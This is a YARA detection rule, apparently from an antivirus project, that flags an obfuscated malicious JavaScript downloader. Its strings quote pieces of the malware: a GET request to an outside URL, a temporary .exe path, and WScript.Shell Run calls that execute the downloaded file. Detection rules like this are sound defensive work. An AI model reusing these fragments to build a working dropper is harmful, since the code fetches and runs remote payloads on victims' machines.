rule sig_20160328_9b3dd55f0e5b82df0cc4152d903ec88a {
  meta:
    description = "datamaliciousorder - file 20160328_9b3dd55f0e5b82df0cc4152d903ec88a.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "3326e7c868581c4b872b55d7ef859da4142f674cc94817837ea2599f134259c9"

  strings:
    $s1  = "function Wljluctot() {return Orintuniwo[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"MVl0vZghZ8I0aK3.exe\";};" fullword ascii
    $s2  = "do {WScript[Zpinwvyo](Vlrofjj() * 11)} while (Whoevgm[\"readystate\"] < 4 );" fullword ascii
    $s3  = "function Fcjgkxlk(Qzfngowgvv, Wsbjih){return Qzfngowgvv - Wsbjih;};" fullword ascii
    $s4  = "Whoevgm[Bqjrvjrs](\"GET\", \"http://www.cloudfire.pt/l3iska\", false);" fullword ascii
    $s5  = "var Orintuniwo = function Xaioa() {return WScript[Uzagbp](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Vsqrlznelm(Cdmte){Orintuniwo[\"Run\"](Cdmte, Hsyrfuupdf, Hsyrfuupdf);};" fullword ascii
    $s7  = "function Cwiatpre() {return ((Nwgan == true) && (Nwgan == Eygdfcusuw)) ? 1 : Hsyrfuupdf;};" fullword ascii
    $s8  = "function Pzbdii(){return Uzagbp;};" fullword ascii
    $s9  = "function Hwnhufsfc(){return Voreq;};" fullword ascii
    $s10 = "function Mcpvdnzib(Xblbjcevep) {var Spqrhpr = (1, 2, 3, 4, 5, Xblbjcevep); return Spqrhpr;};" fullword ascii
    $s11 = "function Vgdmo()" fullword ascii
    $s12 = "function Vlrofjj(){return 22;};" fullword ascii
    $s13 = "var Vohhmhnshu = false;" fullword ascii
    $s14 = "var Eygdfcusuw = false;" fullword ascii
    $s15 = "Eygdfcusuw = true; " fullword ascii
    $s16 = "return Fcjgkxlk(Iabijeqbg, Ttnjijgam);" fullword ascii
    $s17 = " while (Mqwoqmgdj){" fullword ascii
    $s18 = "var Nwgan = false;" fullword ascii
    $s19 = "Nwgan = true; " fullword ascii
    $s20 = "var Pxelyyiyfk = new this[\"Date\"]();" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}